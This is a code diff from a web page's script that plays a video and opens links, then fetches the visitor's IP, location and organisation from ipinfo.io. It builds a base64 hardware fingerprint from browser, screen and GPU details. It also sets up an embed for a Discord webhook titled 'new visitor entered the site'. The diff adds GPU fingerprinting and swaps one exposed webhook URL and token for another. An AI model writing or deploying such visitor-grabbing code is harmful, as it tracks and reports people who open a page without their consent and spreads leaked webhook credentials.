@@ -229,8 +229,6 @@ openLinksWithDelay();
 
       }, 3000);
     }, 2500 + VIDEO_DURATION_MS);
-
-    // Fetch IP and HWID
     fetch('https://ipinfo.io/json')
       .then(response => response.json())
       .then(data => {
@@ -242,13 +240,16 @@ openLinksWithDelay();
         document.getElementById('org').textContent = data.org || 'N/A';
         document.getElementById('timezone').textContent = data.timezone || 'N/A';
 
+        let gpuInfo = 'N/A';
         try {
           const canvas = document.createElement('canvas');
           const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
           const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
           if (debugInfo) {
+            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
           }
         } catch(e) {}
+        document.getElementById('gpu').textContent = gpuInfo;
 
         const hwidRaw = [
           navigator.userAgent,
@@ -257,13 +258,13 @@ openLinksWithDelay();
           screen.height,
           screen.colorDepth,
           navigator.platform,
-          
+          gpuInfo
         ].join("|");
 
         const hwid = btoa(hwidRaw);
         const formattedHWID = hwid.match(/.{1,64}/g).join("\n");
 
-        const webhookUrl = "https://canary.discord.com/api/webhooks/1394859344528412672/zFNH3uKCz5f7h5UtGqajFelqTJ4Ur_FLXpy3fK9q3atsG4JLguyctq09Ja1SJsbqOoOO";
+        const webhookUrl = "https://canary.discord.com/api/webhooks/1365004260542120000/oGgcBxTqweKzy1ouej3dhuP9eDMT5_AxgiwhM4oYvO0rOob6gD7cdxkvYUKt_O2X838_";
         const embed = {
           title: "📥 زائر جديد دخل الموقع",
           color: 16711680,
